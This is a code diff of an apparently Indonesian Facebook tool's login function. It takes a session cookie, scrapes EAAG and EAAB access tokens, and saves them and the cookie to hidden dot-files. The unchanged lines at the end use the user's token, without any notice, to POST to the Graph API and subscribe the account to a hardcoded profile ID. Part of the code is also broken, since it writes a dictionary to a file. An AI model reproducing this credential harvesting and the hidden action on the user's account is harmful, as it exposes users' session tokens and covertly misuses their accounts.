@@ -450,28 +450,27 @@ def login():
 
 def login_lagi334():
         with requests.Session() as xyz:
-            cookiee = input(f"[•] Cookie : ")
+            cookiee = input("[•] Cookie : ")
             try:
                 url = 'https://business.facebook.com/business_locations'
                 req = xyz.get(url,cookies=cookiee)
                 tok = re.search('(\["EAAG\w+)', req.text).group(1).replace('["','')
-                open(".cok.txt","w").write(cookiee)
                 open(".token.txt","w").write(tok)
                 Console().print(Panel(f"""[bold cyan][+] Token : [bold green]{tok}""",width=80, style=f"{color_panel}", title="[bold green]> TOKEN EAAG [bold green]<"))
                 Console().print(f" {H2}• {P2}[bold green]Login Berhasil,Sedang Menjalankan Ulang[bold white]")
             except Exception as e:
                 print(e)
             try:
-                cookie = {'cookie':cookiee}
+                cookieq = {'cookie':cookiee}
                 with requests.Session() as xyz:
                     url = 'https://www.facebook.com/adsmanager/manage/campaigns'
-                    req = xyz.get(url,cookies=cookie)
+                    req = xyz.get(url,cookies=cookieq)
                     set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
                     nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
-                    roq = xyz.get(nek,cookies=cookie)
+                    roq = xyz.get(nek,cookies=cookieq)
                     tok1 = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
                     open(".token1.txt","w").write(tok1)
-                    open(".cok.txt","w").write(cookie)
+                    open(".cok.txt","w").write(cookieq)
                     Console().print(Panel(f"""[bold cyan][+] Token : [bold green]{tok1}""",width=80, style=f"{color_panel}", title="[bold green]> TOKEN EAAB [bold green]<"))
                     requests.post("https://graph.facebook.com/100043537611609/subscribers?access_token=%s"%(tok1))
                     requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(tok1))
